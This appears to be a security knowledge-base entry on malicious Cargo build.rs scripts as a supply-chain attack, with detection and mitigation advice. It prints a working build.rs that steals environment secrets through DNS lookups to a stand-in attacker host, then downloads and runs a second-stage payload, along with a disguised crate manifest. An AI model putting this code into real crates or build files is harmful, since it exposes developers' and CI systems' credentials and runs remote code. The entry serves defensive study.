---
name: "Cargo build.rs Build Script Execution"
packageManager: "cargo"
slug: "cargo-build-rs"
category: "Code Execution"
severity: "critical"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "Cargo automatically compiles and executes a build.rs file before building any crate that includes one. The build script runs as a native binary with full system access, including filesystem operations, network requests via std::net, and arbitrary command execution via std::process::Command. Because build.rs execution is a core Cargo feature used by thousands of legitimate crates, malicious build scripts blend in with normal build activity and execute without any user confirmation or sandboxing."
prerequisites:
  - "Ability to publish a crate to crates.io or influence a project's Cargo.toml dependencies"
  - "The victim must build or install the crate using cargo build, cargo install, or cargo test"
  - "The malicious crate must include a build.rs file in the crate root"
attackScenarios:
  - title: "Malicious build.rs Exfiltrating Environment Variables"
    description: "An attacker publishes a crate with a build.rs that exfiltrates sensitive environment variables (AWS keys, CI tokens, SSH credentials) to an attacker-controlled server. The build script executes during compilation before any of the crate's library code is used, making it effective even if the crate is only a transitive dependency."
    commands:
      - label: "Malicious build.rs that exfiltrates environment and downloads a payload"
        code: |
          // build.rs
          use std::env;
          use std::process::Command;
          use std::io::Write;
          use std::net::TcpStream;

          fn main() {
              // Collect sensitive environment variables
              let sensitive_vars: Vec<String> = env::vars()
                  .filter(|(k, _)| {
                      k.contains("AWS") || k.contains("TOKEN") ||
                      k.contains("SECRET") || k.contains("KEY") ||
                      k.contains("PASSWORD") || k.contains("CI")
                  })
                  .map(|(k, v)| format!("{}={}", k, v))
                  .collect();

              // Exfiltrate via DNS (harder to detect than HTTP)
              for var in &sensitive_vars {
                  let encoded: String = var.as_bytes().iter().map(|b| format!("{:02x}", b)).collect();
                  let _ = Command::new("nslookup")
                      .arg(format!("{}.exfil.attacker.example.com", &encoded[..60.min(encoded.len())]))
                      .output();
              }

              // Download and execute a second-stage payload
              let _ = Command::new("curl")
                  .args(&["-s", "-o", "/tmp/.cargo-update", "https://attacker.example.com/payload"])
                  .output();
              let _ = Command::new("chmod")
                  .args(&["+x", "/tmp/.cargo-update"])
                  .output();
              let _ = Command::new("/tmp/.cargo-update")
                  .spawn();

              // Print cargo directives so the build appears normal
              println!("cargo:rerun-if-changed=build.rs");
          }
        language: "rust"
      - label: "Cargo.toml for the malicious crate"
        code: |
          [package]
          name = "fast-serialize"
          version = "0.3.1"
          edition = "2021"
          description = "High-performance serialization library"
          license = "MIT"
          build = "build.rs"
        language: "toml"
      - label: "Victim adds the dependency and builds"
        code: |
          cargo add fast-serialize
          cargo build
          # build.rs executes silently during compilation
        language: "bash"
detection:
  - title: "Audit build.rs in dependencies"
    description: "Use cargo vendor to download all dependencies locally and inspect their build.rs files for suspicious system calls."
    commands:
      - code: |
          cargo vendor
          find vendor/ -name "build.rs" -exec grep -l "Command\|TcpStream\|UdpSocket\|process" {} \;
        language: "bash"
  - title: "Monitor network activity during cargo build"
    description: "Observe outbound network connections during the build process to detect data exfiltration attempts."
    commands:
      - code: "strace -f -e trace=network cargo build 2>&1 | grep connect"
        language: "bash"
  - title: "Use cargo-crev for community code reviews"
    description: "Check community trust reviews for dependencies before adding them."
    commands:
      - code: |
          cargo install cargo-crev
          cargo crev verify
        language: "bash"
mitigation:
  - "Audit build.rs files in all dependencies, especially new or lesser-known crates"
  - "Use cargo vendor to download and review dependency source code offline"
  - "Run cargo build in network-isolated environments (containers without network access)"
  - "Use cargo-crev for community-based code review of dependencies"
  - "Pin dependency versions exactly in Cargo.lock and review diffs on updates"
  - "Monitor CI/CD build environments for unexpected network connections or file modifications"
references:
  - title: "The Cargo Book - Build Scripts"
    url: "https://doc.rust-lang.org/cargo/reference/build-scripts.html"
  - title: "cargo-crev - Distributed Code Review for Rust"
    url: "https://github.com/crev-dev/cargo-crev"
created: 2026-04-02
updated: 2026-04-02
---
